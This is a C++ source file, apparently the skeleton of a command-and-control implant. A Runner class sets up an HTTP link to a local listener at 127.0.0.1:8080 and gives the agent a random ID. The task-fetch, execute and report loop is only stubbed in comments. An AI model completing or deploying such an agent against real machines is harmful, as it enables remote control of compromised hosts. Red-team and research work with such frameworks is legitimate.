#include <Windows.h>
#include "utils/buffer.h"
#include "utils/winapi.h"
#include "runner/runner.h"
#include "communicators/base.h"
#include "communicators/http.h"
#include "utils/random.h"

/* Constructor */
Runner::Runner() : winApiCustom(),
                   communicator(HttpCommunicator(&winApiCustom, "127.0.0.1", 8080, "/path1\x00/path2\x00", NULL))
{
    // Prepare Agent ID
    this->pAgentId = (PCHAR)this->winApiCustom.HeapAllocCustom(6);
    if (this->pAgentId != NULL)
    {
        RandomGenerator randomGenerator = RandomGenerator(&this->winApiCustom);
        randomGenerator.GenerateRandomStr(6, this->pAgentId);
    }

    // Prepare ToSend and Received queues

    // Set Agent ID in Communicator
    this->communicator.SetAgentId(pAgentId);

    // Prepare Executor
}

/* Destructor */
Runner::~Runner()
{
    // Free heap for Agent ID
    if (this->pAgentId != NULL)
        this->winApiCustom.HeapFreeCustom(this->pAgentId);
}

void Runner::Run()
{
    // Add data to ToSend for registering this Agent

    // Start Communicator
    /*
    while (TRUE)
    {
        // Send any Task outputs and new Task Request to listener; receive new Tasks from Listener

        // Store received new tasks

        // Execute all tasks for this agent and store Task output
    }
    */

    // Start Executor

    // Wait for Communicator and Executor to finish
}